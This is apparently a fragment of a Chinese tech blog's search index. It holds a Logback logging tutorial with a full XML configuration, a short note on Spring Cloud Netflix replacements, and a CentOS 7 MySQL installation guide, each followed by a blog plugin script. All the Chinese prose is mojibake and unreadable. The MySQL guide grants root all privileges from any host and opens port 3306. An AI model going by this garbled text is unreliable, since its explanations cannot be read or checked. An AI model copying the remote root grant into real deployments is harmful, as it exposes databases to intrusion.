é‡Œé¢é…ç½®ï¼Œå¦‚ä¸‹ï¼š 123logging: level: com.nmys.view: debug å®Œæ•´çš„ YML é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 1234logging: level: com.nmys.view: debug config: classpath:logback/logback-spring.xml JMX åŠ¨æ€ä¿®æ”¹ Logback çš„æ—¥å¿—çº§åˆ« åº”ç”¨ä¸Šçº¿åå¸¸å¸¸ä¼šé¢å¯¹è¿™æ ·ä¸€ç§å›°å¢ƒï¼Œå³å¦‚æœæŠŠæ—¥å¿—çº§åˆ«å¼€å¾—å¤ªé«˜ï¼Œé‚£ä¹ˆå½“ç³»ç»Ÿå‡ºç°é—®é¢˜æ—¶ä¸å¥½æŸ¥ï¼Œå¦‚æœæŠŠæ—¥å¿—çº§åˆ«å®šå¾—å¤ªä½ï¼Œé‚£ä¹ˆç¡¬ç›˜å¾ˆå¯èƒ½å¾ˆå¿«å°±è¢«æ’‘çˆ†äº†ã€‚è¿™æ—¶å€™å¸¸å¸¸é€‰æ‹©å…ˆå°†æ—¥å¿—çº§åˆ«å®šé«˜ç‚¹ï¼Œå½“å‡ºç°é—®é¢˜æ—¶ï¼Œå†è°ƒä½ã€‚å¤§éƒ¨åˆ†æ—¶å€™å¼€å‘è€…ä¹ æƒ¯çš„åšæ³•æ˜¯ç›´æ¥ä¿®æ”¹ Logback çš„é…ç½®æ–‡ä»¶ï¼Œç„¶åé‡å¯åº”ç”¨ã€‚è¿™æ ·åšå½“ç„¶æœ‰é—®é¢˜ï¼Œåº”ç”¨è·‘å¾—å¥½å¥½çš„ï¼Œç”¨æˆ·ç”¨ç€å¥½å¥½çš„ï¼Œä¸ºä»€ä¹ˆè¦é‡å¯å‘¢ï¼Ÿè°æ¥åº”å¯¹é‡å¯æ—¶å®¢æˆ·çš„æ€’ç«å‘¢ï¼ŸLogback çš„å¼€å‘è€…æƒ³å¾—å¾ˆå‘¨åˆ°ï¼Œé»˜è®¤ä¸ºç”¨æˆ·æä¾›äº†ä¸€ç§åŠ¨æ€ä¿®æ”¹æ—¥å¿—çº§åˆ«çš„èƒ½åŠ›ï¼Œè€Œä¸éœ€è¦æ‰‹åŠ¨é‡å¯åº”ç”¨ã€‚é…ç½®æ–¹å¼å¾ˆç®€å•ï¼Œåªéœ€åœ¨ Logback çš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹ä¸€è¡Œå†…å®¹å³å¯ï¼š 123&lt;configuration&gt; &lt;jmxConfigurator/&gt;&lt;/configuration&gt; IDEA å½©è‰²æ—¥å¿—æ’ä»¶ ä¸Šè¿°çš„å½©è‰²æ—¥å¿—éœ€è¦ä¾èµ– IDEA é‡Œçš„ Grep Console æ’ä»¶ï¼š æ—¥å¿—ä»£ç æ€§èƒ½ä¼˜åŒ– è¿™é‡Œå†è¯´ä¸‹æ—¥å¿—è¾“å‡ºä»£ç ï¼Œä¸€èˆ¬æœ‰äººå¯èƒ½åœ¨ä»£ç ä¸­ä½¿ç”¨å¦‚ä¸‹æ–¹å¼è¾“å‡ºï¼š 12Object entry = new SomeObject();logger.debug("The entry is " + entry); ä¸Šé¢çœ‹èµ·æ¥æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯ä¼šå­˜åœ¨æ„é€ æ¶ˆæ¯å‚æ•°çš„æˆæœ¬ï¼Œå³å°† entry è½¬æ¢æˆå­—ç¬¦ä¸²ç›¸åŠ ã€‚å¹¶ä¸”æ— è®ºæ˜¯å¦è®°å½•æ¶ˆæ¯ï¼Œéƒ½æ˜¯å¦‚æ­¤ï¼Œå³é‚£æ€•æ—¥å¿—çº§åˆ«ä¸º INFOï¼Œä¹Ÿä¼šæ‰§è¡Œæ‹¬å·é‡Œé¢çš„æ“ä½œï¼Œä½†æ˜¯æ—¥å¿—ä¸ä¼šè¾“å‡ºï¼Œä¸‹é¢æ˜¯ä¼˜åŒ–åçš„å†™æ³•ï¼š 1234if(logger.isDebugEnabled()) { Object entry = new SomeObject(); logger.debug("The entry is " + entry);} ä¸Šé¢çš„å†™æ³•é¦–å…ˆå¯¹è®¾ç½®çš„æ—¥å¿—çº§åˆ«è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¦‚æœä¸º DEBUG æ—¥å¿—çº§åˆ«ï¼Œæ‰è¿›è¡Œå‚æ•°çš„æ„é€ ï¼Œå¯¹ç¬¬ä¸€ç§å†™æ³•è¿›è¡Œäº†æ”¹å–„ã€‚ä¸è¿‡è¿˜æœ‰æœ€å¥½çš„å†™æ³•ï¼Œä½¿ç”¨å ä½ç¬¦ï¼š 12Object entry = new SomeObject();logger.debug("The entry is {}.", entry); åªæœ‰åœ¨è¯„ä¼°æ˜¯å¦è®°å½•ä¹‹åï¼Œå¹¶ä¸”åœ¨å†³ç­–æ˜¯è‚¯å®šçš„æƒ…å†µä¸‹ï¼Œè®°å½•å™¨å®ç°æ‰ä¼šæ ¼å¼åŒ–æ¶ˆæ¯å¹¶å°† {} å¯¹æ›¿æ¢ä¸ºæ¡ç›®çš„å­—ç¬¦ä¸²å€¼ã€‚æ¢å¥è¯è¯´ï¼Œå½“ç¦ç”¨æ—¥å¿—è¯­å¥æ—¶ï¼Œæ­¤ä»£ç ä¸ä¼šäº§ç”Ÿå‚æ•°æ„é€ çš„æˆæœ¬ã€‚Logback ä½œè€…è¿›è¡Œæµ‹è¯•å¾—å‡ºï¼šç¬¬ä¸€ç§å’Œç¬¬ä¸‰ç§å†™æ³•å°†äº§ç”Ÿå®Œå…¨ç›¸åŒçš„è¾“å‡ºã€‚ä½†æ˜¯ï¼Œåœ¨ç¦ç”¨æ—¥å¿—è®°å½•çš„æƒ…å†µä¸‹ï¼Œç¬¬ä¸‰ä¸ªå˜ä½“å°†æ¯”ç¬¬ä¸€ä¸ªå˜ä½“ä¼˜äºè‡³å°‘ 30 å€æ€§èƒ½ã€‚ å¦‚æœæœ‰å¤šä¸ªå‚æ•°ï¼Œå†™æ³•å¦‚ä¸‹ï¼š 1logger.debug("The new entry is {}. It replaces {}.", entry, oldEntry); å¦‚æœéœ€è¦ä¼ é€’ä¸‰ä¸ªæˆ–æ›´å¤šå‚æ•°ï¼Œåˆ™è¿˜å¯ä»¥ä½¿ç”¨ Object [] å˜ä½“ï¼š 12Object[] paramArray = {newVal, below, above};logger.debug("Value {} was inserted between {} and {}.", paramArray); è®°å½•æ—¥å¿—çš„æ—¶å€™å¯èƒ½éœ€è¦åœ¨æ–‡ä»¶ä¸­è®°å½•ä¸‹å¼‚å¸¸çš„å †æ ˆä¿¡æ¯ï¼Œç»è¿‡æµ‹è¯•ï¼Œlogger.error(e) å¯èƒ½ä¸ä¼šæ‰“å°å‡ºå †æ ˆä¿¡æ¯ï¼Œæ­£ç¡®çš„å†™æ³•æ˜¯ï¼š 1logger.error("ç¨‹åºå¼‚å¸¸, è¯¦ç»†ä¿¡æ¯:{}", e.getLocalizedMessage(), e); MyBatis Plus æ‰“å° SQL æ—¥å¿— åœ¨ MyBatis-Plus çš„é…ç½®ä¸­ï¼ŒåŠ å…¥ log-impl: org.apache.ibatis.logging.stdout.StdOutImpl å³å¯ 1234mybatis-plus: mapper-locations: classpath:/mapper/*.xml configuration: log-impl: org.apache.ibatis.logging.stdout.StdOutImpl ä¼ä¸šé¡¹ç›®å¼€å‘é…ç½®å®ä¾‹ â˜…å±•å¼€é…ç½®å†…å®¹â˜… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- æ—¥å¿—çº§åˆ«ä»ä½åˆ°é«˜åˆ†ä¸ºTRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATALï¼Œå¦‚æœè®¾ç½®ä¸ºWARNï¼Œåˆ™ä½äºWARNçš„ä¿¡æ¯éƒ½ä¸ä¼šè¾“å‡º --&gt;&lt;!-- scan:å½“æ­¤å±æ€§è®¾ç½®ä¸ºtrueæ—¶ï¼Œé…ç½®æ–‡ä»¶å¦‚æœå‘ç”Ÿæ”¹å˜ï¼Œå°†ä¼šè¢«é‡æ–°åŠ è½½ï¼Œé»˜è®¤å€¼ä¸ºtrue --&gt;&lt;!-- scanPeriod:è®¾ç½®ç›‘æµ‹é…ç½®æ–‡ä»¶æ˜¯å¦æœ‰ä¿®æ”¹çš„æ—¶é—´é—´éš”ï¼Œå¦‚æœæ²¡æœ‰ç»™å‡ºæ—¶é—´å•ä½ï¼Œé»˜è®¤å•ä½æ˜¯æ¯«ç§’ã€‚å½“scanä¸ºtrueæ—¶ï¼Œæ­¤å±æ€§ç”Ÿæ•ˆã€‚é»˜è®¤çš„æ—¶é—´é—´éš”ä¸º1åˆ†é’Ÿã€‚ --&gt;&lt;!-- debug:å½“æ­¤å±æ€§è®¾ç½®ä¸ºtrueæ—¶ï¼Œå°†æ‰“å°å‡ºlogbackå†…éƒ¨æ—¥å¿—ä¿¡æ¯ï¼Œå®æ—¶æŸ¥çœ‹logbackè¿è¡ŒçŠ¶æ€ã€‚é»˜è®¤å€¼ä¸ºfalseã€‚ --&gt;&lt;configuration scan="true" scanPeriod="60 seconds" debug="false"&gt; &lt;!-- JMX æ”¯æŒ--&gt; &lt;jmxConfigurator/&gt; &lt;!-- æ—¥å¿—ä¸Šä¸‹æ–‡åç§°--&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;!-- æ—¥å¿—æ–‡ä»¶çš„ç›®å½•è·¯å¾„--&gt; &lt;property name="log.path" value="/tmp/log/pricing/eureka" /&gt; &lt;!-- å½©è‰²æ—¥å¿—ä¾èµ–çš„æ¸²æŸ“ç±»ä¸å½©è‰²æ—¥å¿—æ ¼å¼ --&gt; &lt;conversionRule conversionWord="clr" converterClass="org.springframework.boot.logging.logback.ColorConverter" /&gt; &lt;conversionRule conversionWord="wex" converterClass="org.springframework.boot.logging.logback.WhitespaceThrowableProxyConverter" /&gt; &lt;conversionRule conversionWord="wEx" converterClass="org.springframework.boot.logging.logback.ExtendedWhitespaceThrowableProxyConverter" /&gt; &lt;property name="CONSOLE_LOG_PATTERN" value="${CONSOLE_LOG_PATTERN:-%clr(%d{yyyy-MM-dd HH:mm:ss.SSS}){faint} %clr(${LOG_LEVEL_PATTERN:-%5p}) %clr(${PID:- }){magenta} %clr(---){faint} %clr([%15.15t]){faint} %clr(%-40.40logger{39}){cyan} %clr(:){faint} %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}"/&gt; &lt;!--è¾“å‡ºåˆ°æ§åˆ¶å°--&gt; &lt;appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;!--æ­¤æ—¥å¿—appenderæ˜¯ä¸ºå¼€å‘ä½¿ç”¨ï¼Œåªé…ç½®æœ€åº•çº§åˆ«ï¼Œæ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—çº§åˆ«æ˜¯å¤§äºæˆ–ç­‰äºæ­¤çº§åˆ«çš„æ—¥å¿—ä¿¡æ¯--&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;Pattern&gt;${CONSOLE_LOG_PATTERN}&lt;/Pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--è¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶--&gt; &lt;!-- æ—¶é—´æ»šåŠ¨è¾“å‡ºlevelä¸ºDEBUGæ—¥å¿— --&gt; &lt;appender name="DEBUG_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- æ­£åœ¨è®°å½•çš„æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„åŠæ–‡ä»¶å --&gt; &lt;file&gt;${log.path}/log_debug.log&lt;/file&gt; &lt;!--æ—¥å¿—æ–‡ä»¶è¾“å‡ºæ ¼å¼--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- æ—¥å¿—è®°å½•å™¨çš„æ»šåŠ¨ç­–ç•¥ï¼ŒæŒ‰æ—¥æœŸï¼ŒæŒ‰å¤§å°è®°å½• --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- æ—¥å¿—å½’æ¡£ --&gt; &lt;fileNamePattern&gt;${log.path}/debug/log-debug-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤©æ•°--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- æ­¤æ—¥å¿—æ–‡ä»¶åªè®°å½•DEBUGçº§åˆ«çš„ --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;debug&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- æ—¶é—´æ»šåŠ¨è¾“å‡ºlevelä¸ºINFOæ—¥å¿— --&gt; &lt;appender name="INFO_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- æ­£åœ¨è®°å½•çš„æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„åŠæ–‡ä»¶å --&gt; &lt;file&gt;${log.path}/log_info.log&lt;/file&gt; &lt;!--æ—¥å¿—æ–‡ä»¶è¾“å‡ºæ ¼å¼--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- æ—¥å¿—è®°å½•å™¨çš„æ»šåŠ¨ç­–ç•¥ï¼ŒæŒ‰æ—¥æœŸï¼ŒæŒ‰å¤§å°è®°å½• --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- æ¯å¤©æ—¥å¿—å½’æ¡£è·¯å¾„ä»¥åŠæ ¼å¼ --&gt; &lt;fileNamePattern&gt;${log.path}/info/log-info-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤©æ•°--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- æ­¤æ—¥å¿—æ–‡ä»¶åªè®°å½•INFOçº§åˆ«çš„ --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- æ—¶é—´æ»šåŠ¨è¾“å‡ºlevelä¸ºWARNæ—¥å¿— --&gt; &lt;appender name="WARN_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- æ­£åœ¨è®°å½•çš„æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„åŠæ–‡ä»¶å --&gt; &lt;file&gt;${log.path}/log_warn.log&lt;/file&gt; &lt;!--æ—¥å¿—æ–‡ä»¶è¾“å‡ºæ ¼å¼--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- æ—¥å¿—è®°å½•å™¨çš„æ»šåŠ¨ç­–ç•¥ï¼ŒæŒ‰æ—¥æœŸï¼ŒæŒ‰å¤§å°è®°å½• --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/warn/log-warn-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤©æ•°--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- æ­¤æ—¥å¿—æ–‡ä»¶åªè®°å½•WARNçº§åˆ«çš„ --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;warn&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- æ—¶é—´æ»šåŠ¨è¾“å‡ºlevelä¸ºERRORæ—¥å¿— --&gt; &lt;appender name="ERROR_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- æ­£åœ¨è®°å½•çš„æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„åŠæ–‡ä»¶å --&gt; &lt;file&gt;${log.path}/log_error.log&lt;/file&gt; &lt;!--æ—¥å¿—æ–‡ä»¶è¾“å‡ºæ ¼å¼--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- æ—¥å¿—è®°å½•å™¨çš„æ»šåŠ¨ç­–ç•¥ï¼ŒæŒ‰æ—¥æœŸï¼ŒæŒ‰å¤§å°è®°å½• --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/error/log-error-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤©æ•°--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- æ­¤æ—¥å¿—æ–‡ä»¶åªè®°å½•ERRORçº§åˆ«çš„ --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;root level="info"&gt; &lt;appender-ref ref="CONSOLE" /&gt; &lt;appender-ref ref="DEBUG_FILE" /&gt; &lt;appender-ref ref="INFO_FILE" /&gt; &lt;appender-ref ref="WARN_FILE" /&gt; &lt;appender-ref ref="ERROR_FILE" /&gt; &lt;/root&gt;&lt;/configuration&gt; 1234logging: level: com.nmys.view: debug config: classpath:logback/logback-spring.xml å‚è€ƒèµ„æ–™ Spring Boot æ•´åˆ Logback æ—¥å¿—æ¡†æ¶ Spring Boot 2.0 æ•´åˆ Logback æ—¥å¿—æ¡†æ¶ Spring Boot ä½¿ç”¨ Logback æ—¥å¿—æ¡†æ¶è¶…è¯¦ç»†æ•™ç¨‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"SpringCloud å„ç»„ä»¶çš„ç‰ˆæœ¬è¯´æ˜ï¼ˆæŒç»­æ›´æ–°ï¼‰",url:"/posts/88441946.html",text:'Netflix å„ç»„ä»¶æ›¿ä»£æ–¹æ¡ˆæ›¿ä»£æ–¹æ¡ˆæ¦‚è§ˆ æ›¿ä»£æ–¹æ¡ˆè¯´æ˜Hystrix Netflix Hystrix æ˜¯ Spring Cloud ä¸­æœ€æ—©æ”¯æŒçš„ä¸€ç§å®¹é”™æ–¹æ¡ˆï¼Œåœ¨ 2018 å¹´ 11 æœˆ 20 æ—¥ä¹‹åå®˜æ–¹å·²ç»åœæ­¢ç»´æŠ¤ï¼Œæœ€åä¸€ä¸ªæ­£å¼ç‰ˆæœ¬ä¸º 1.5.18ã€‚åœ¨ Spring Cloud Greenwich ç‰ˆä¸­ï¼ŒSpring å®˜æ–¹æ¨èä½¿ç”¨ Resilience4j æ›¿ä»£ Hystrixã€‚ Zuul 1.x Netflix è™½ç„¶å·²ç»åœ¨ 2018 å¹´ 5 æœˆå¼€æºäº† Zuul 2.xï¼Œä½†ç”±äº Zuul 2.x åœ¨ Spring Cloud Gateway å­µåŒ–ä¹‹å‰ä¸€ç›´è·³ç¥¨å‘å¸ƒï¼Œè€Œä¸” Spring Cloud Gateway ç›®å‰å·²ç»å­µåŒ–æˆåŠŸï¼Œç›¸è¾ƒäº Zuul 1.x åœ¨åŠŸèƒ½ä»¥åŠæ€§èƒ½ä¸Šéƒ½æœ‰æ˜æ˜¾çš„æå‡ã€‚Spring å®˜æ–¹æ¨èä½¿ç”¨ Spring Cloud Gateway æ›¿ä»£ Zuul 1.xï¼Œå› æ­¤åœ¨ Spring Boot 2.0 ä»¥ä¸Šç‰ˆæœ¬ä¸­ï¼Œå¹¶æ²¡æœ‰å¯¹ Zuul 2.0 ä»¥ä¸Šæœ€æ–°é«˜æ€§èƒ½ç‰ˆæœ¬è¿›è¡Œé›†æˆï¼Œä»ç„¶ä½¿ç”¨ Zuul 1.x é Reactor æ¨¡å¼ï¼ˆåŸºäº Servlet 2.5 é˜»å¡æ¶æ„ï¼‰çš„æ—§ç‰ˆæœ¬ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Centos7 ä½¿ç”¨ RPM æºå®‰è£… MySQL",url:"/posts/988f02de.html",text:'ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux å¸è½½ Mariadb 12345# æŸ¥æ‰¾mariadbæ¨¡å—# rpm -qa | grep mariadb# åˆ é™¤æŸ¥æ‰¾åˆ°çš„mariadbæ¨¡å—# rpm -e --nodeps xxxx RPM æºå®‰è£… MySQL 1234567891011121314151617# ä¸‹è½½repository# wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm# å®‰è£…repository# rpm -ivh mysql57-community-release-el7-11.noarch.rpm# æŸ¥çœ‹repositoryæ˜¯å¦å®‰è£…æˆåŠŸ# yum repolist enabled | grep "mysql.*-community.*"# å®‰è£…mysql# yum install -y mysql-community-libs-compat mysql-community-server# å¯åŠ¨mysql# systemctl start mysqld# æŸ¥çœ‹mysqlå¯åŠ¨çŠ¶æ€# systemctl status mysqld å¼€æœºè‡ªå¯åŠ¨ MySQL 12345# è‡ªå¯åŠ¨# systemctl enable mysqld# é‡è½½é…ç½®# systemctl daemon-reload æ›´æ”¹ Root æœ¬åœ°ç™»å½•å¯†ç ã€å…è®¸ Root è¿œç¨‹ç™»å½• 1234567891011121314# æŸ¥çœ‹mysqlå®‰è£…æ—¶é»˜è®¤åˆ›å»ºçš„å¯†ç # grep \'temporary password\' /var/log/mysqld.log# ç™»å½•mysql# mysql -h localhost -u root -p# æ›´æ”¹rootæœ¬åœ°ç™»å½•å¯†ç ï¼ˆç”±äºmysqlè‡ªèº«é»˜è®¤çš„å¯†ç æ£€æŸ¥ç­–ç•¥ï¼Œå¯†ç å¿…é¡»åŒ…å«ï¼šå¤§å°å†™å­—æ¯ã€æ•°å­—å’Œç‰¹æ®Šç¬¦å·ï¼Œå¹¶ä¸”é•¿åº¦ä¸èƒ½å°‘äº8ä½ï¼‰mysql&gt; ALTER USER \'root\'@\'localhost\' IDENTIFIED BY \'yourPassword\';# å…è®¸rootè¿œç¨‹ç™»å½•mysql&gt; GRANT ALL PRIVILEGES ON *.* TO \'root\'@\'%\' IDENTIFIED BY \'yourPassword\' WITH GRANT OPTION;# åˆ·æ–°mysqlçš„ç³»ç»Ÿæƒé™ç›¸å…³è¡¨mysql&gt; FLUSH PRIVILEGES; MySQL åŸºç¡€é…ç½®ã€æ€§èƒ½ä¼˜åŒ–é…ç½® 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# å¤‡ä»½é»˜è®¤çš„é…ç½®æ–‡ä»¶# cp /etc/my.cnf /etc/my.cnf.default# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹# vim /etc/my.cnf[client]default-character-set=utf8[mysql]default-character-set=utf8[mysqld]character-set-server=utf8default-storage-engine=INNODBdefault-time-zone="+8:00"explicit_defaults_for_timestamp=true########################################max_allowed_packet=64Mback_log=800 #é‡ç‚¹ä¼˜åŒ–max_connections=5000 #é‡ç‚¹ä¼˜åŒ–table_open_cache=614 #é‡ç‚¹ä¼˜åŒ–ï¼Œå…¶å€¼ä¸max_connectionsç›¸å…³sort_buffer_size=2M #é‡ç‚¹ä¼˜åŒ–ï¼Œå…¶å€¼ä¸max_connectionsç›¸å…³join_buffer_size=2M #é‡ç‚¹ä¼˜åŒ–ï¼Œå…¶å€¼ä¸max_connectionsç›¸å…³thread_cache_size=300 #é‡ç‚¹ä¼˜åŒ–query_cache_size=64M #é‡ç‚¹ä¼˜åŒ–query_cache_limit=4Mquery_cache_min_res_unit=2ktmp_table_size=256Mkey_buffer_size=2048M #é‡ç‚¹ä¼˜åŒ–read_buffer_size=1M #å…¶å€¼ä¸max_connectionsç›¸å…³read_rnd_buffer_size=16M #å…¶å€¼ä¸max_connectionsç›¸å…³bulk_insert_buffer_size=64Minnodb_buffer_pool_size=2048M #é‡ç‚¹ä¼˜åŒ–innodb_thread_concurrency=0 #é‡ç‚¹ä¼˜åŒ–innodb_flush_log_at_trx_commit=1 #é‡ç‚¹ä¼˜åŒ–innodb_log_buffer_size=8Minnodb_log_file_size=128Minnodb_log_files_in_group=3 é…ç½®é˜²ç«å¢™ 12345678# å¼€æ”¾ç«¯å£# firewall-cmd --zone=public --permanent --add-port=3306/tcp# ä¿å­˜é˜²ç«å¢™é…ç½®# firewall-cmd --reload# æŸ¥çœ‹å·²å¼€æ”¾çš„ç«¯å£# firewall-cmd --list-ports ç®¡ç† MySQL æœåŠ¡ 1234567891011# å…³é—­# systemctl stop mysqld# å¯åŠ¨# systemctl start mysqld# é‡å¯# systemctl restart mysqld# æŸ¥çœ‹çŠ¶æ€# systemctl status mysqld æ›´æ”¹ç³»ç»Ÿçš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•° æœ¬ç«™æ•™ç¨‹ é…ç½®æ¦‚è¿° 123456é…ç½®æ–‡ä»¶ï¼š/etc/my.cnfæ•°æ®ç›®å½•ï¼š/var/lib/mysqlæ—¥å¿—æ–‡ä»¶ï¼š/var/log/mysqld.logpidæ–‡ä»¶ï¼š/var/run/mysqld/mysqld.pidsocketæ–‡ä»¶ï¼š/var/lib/mysql/mysql.sockæœåŠ¡å¯åŠ¨è„šæœ¬ï¼š/usr/lib/systemd/system/mysqld.service var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": 